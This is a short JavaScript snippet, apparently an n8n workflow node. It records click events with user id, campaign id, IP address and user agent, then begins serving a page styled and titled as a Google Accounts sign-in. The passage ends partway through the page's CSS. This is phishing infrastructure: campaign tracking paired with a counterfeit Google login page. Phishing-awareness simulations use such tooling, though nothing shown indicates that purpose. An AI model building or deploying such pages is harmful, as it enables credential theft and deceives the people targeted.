// Log the click event and serve a Google-style login page
const query = $input.first().json.query || {};
const event = {
  type: 'click',
  uid: query.uid || 'unknown',
  campaignId: query.cid || 'unknown',
  timestamp: new Date().toISOString(),
  ip: $input.first().json.headers?.['x-forwarded-for'] || 'unknown',
  userAgent: $input.first().json.headers?.['user-agent'] || 'unknown'
};

const staticData = $getWorkflowStaticData('global');
if (!staticData.events) staticData.events = [];
staticData.events.push(event);

const html = `<!DOCTYPE html><html><head><title>Sign in - Google Accounts</title>
<style>body{font-family:Google Sans,Roboto,sans-serif;background:#f0f4f9;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}
